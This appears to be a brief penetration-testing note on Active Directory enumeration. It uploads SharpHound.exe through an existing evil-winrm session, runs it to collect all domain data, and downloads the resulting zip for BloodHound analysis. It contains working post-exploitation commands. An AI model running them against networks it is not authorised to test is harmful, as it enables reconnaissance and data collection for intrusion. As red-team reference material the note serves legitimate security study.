# Bloodhound Enum

in order for us to retrieve domain information, sometimes we will need to do it internally. (without bloodhound-python)
Specifically if we are unauthenticated.

---

## PoC

1) Download SharpHound.exe onto the target system. Assuming we have an evil-winrm session we can utilize the "upload" functionality.

```
upload /usr/share/sharphound/SharpHound.exe SharpHound.exe
```

Executing SharpHound to retrieve ALL domain information.

```
.\SharpHound.exe -c all, gpolocalgroup
```

We can then download the retrieved .zip file locally & upload it to BloodHound.

```
download <file.zip>
```
